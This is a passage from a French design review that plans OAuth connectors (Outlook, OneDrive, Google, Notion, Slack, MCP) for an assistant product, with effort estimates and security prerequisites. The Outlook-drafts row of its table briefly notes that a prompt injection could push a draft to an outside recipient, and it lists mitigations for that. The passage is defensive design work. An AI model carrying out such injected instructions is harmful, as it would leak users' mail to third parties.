- Fiches « Liste de mails » et « Agenda », avec le pied « Source : Outlook · lu à 14:02 · 7 éléments ». Toujours construites à partir des résultats.
- Déclenchement par possessif (« mes mails », « mon agenda »). La mention « @ » peut se limiter à une pastille simple, et le serveur vérifie la cible envoyée dans la liste des connecteurs actifs.

**Durée réaliste :** 20 à 25 jours de développement pour les phases 0 et 1, soit 5 à 6 semaines calendaires pour une personne. Il faut ajouter le délai de vérification de l'éditeur, une relecture de sécurité et un pilote dans 2 ou 3 locataires réels. L'estimation de « 15 jours » est optimiste.

## 5. Ce qui doit attendre

| Fonction | Ce qu'il faut d'abord |
|---|---|
| Brouillons Outlook (`Mail.ReadWrite`) | Phase 2 : numéro à usage unique dans Upstash UE, résumé de confirmation construit par le serveur, destinataires externes mis en évidence (une injection peut pousser un brouillon vers un tiers) |
| OneDrive et SharePoint (`Files.Read.All` / `Sites.Read.All` / `Sites.Selected`) | Phase 2 : consentement administrateur obligatoire. `Files.Read` sur `/me/drive` seul peut venir plus tôt |
| Google Agenda | Phase 2 : vérification des permissions sensibles, ou application « Interne » sur une instance autonome |
| Gmail, Drive complet | Audit CASA (coût annuel, plusieurs semaines), sauf application « Interne » sur une instance autonome |
| Teams (`ChannelMessage.Read.All`) | Consentement administrateur |
| Notion | Phase 2 : verrou de renouvellement (option B), à cause de la rotation des jetons de renouvellement |
| Client MCP générique, CRM | Phase 3 ; la spécification MCP 2026-07-28 est vérifiée (voir ci-dessous). Désactivé par défaut, liste blanche d'hôtes, descriptions d'outils jamais mises dans l'invite |
| Slack | Phase 4 ; seulement en application interne à un espace de travail, ou par le serveur MCP de Slack |
| Option B, administration par organisation | Phase 4 |

**Total réaliste jusqu'à la phase 4 :** 60 à 75 jours de développement, plus l'audit Google en parallèle (au lieu de 45 à 55 jours).

## 6. Ce qui est juste dans la conception

- La CSP n'a pas à bouger pour la connexion (`form-action` ne s'applique pas à une navigation) et `connect-src 'self'` suffit.
- Écarter Google Picker est le bon choix.
- `SameSite=Lax` pour le cookie temporaire, `Strict` pour le cookie de jetons.
- Côté MCP, la spécification 2026-07-28 confirme :
  - OAuth 2.1, PKCE et `iss` ;
  - `resource` (RFC 8707) obligatoire dans la demande d'autorisation et dans la demande de jeton ;
  - jeton jamais dans l'URL, envoyé seulement au serveur pour lequel il a été émis ;
  - documents de métadonnées client (`client_id` en URL) recommandés, enregistrement dynamique déprécié ;
  - permissions prises dans `WWW-Authenticate`, sinon dans `scopes_supported`, et montée en permissions sur un 403 `insufficient_scope`.
- Pas d'envoi de mail ni de `Mail.Send`, et un seul corps de mail lu à la demande.

## Sources

- https://learn.microsoft.com/en-us/graph/api/search-query?view=graph-rest-1.0
- https://learn.microsoft.com/en-us/entra/identity/enterprise-apps/manage-app-consent-policies
- https://office365itpros.com/2025/06/19/app-consent-policy-user-app-consent/ (MC1097272)
- https://learn.microsoft.com/en-us/entra/identity-platform/publisher-verification-overview
- https://support.google.com/cloud/answer/13465431 (évaluation de sécurité)
- https://support.google.com/cloud/answer/13463816 (renouvellement annuel)
- https://developers.google.com/identity/protocols/oauth2/production-readiness/restricted-scope-verification
- https://groups.google.com/g/google-apps-script-community/c/XgsHT2Fr7u8 (coût CASA, source communautaire)
- https://modelcontextprotocol.io/specification/latest/basic/authorization

Fichiers lus : `/home/user/BirdS/birds/harness/guard.py` (lignes 47, 181 à 207, 499 à 510), `/home/user/BirdS/birds/web/server.py` (lignes 36 et 430 à 442), `/home/user/BirdS/birds/web/tokens.py`, `/home/user/BirdS/docs/HARNESS.md` (lignes 95 et 96), `/home/user/BirdS/docs/DEPLOY_VERCEL.md` (§ 1 et ligne 135).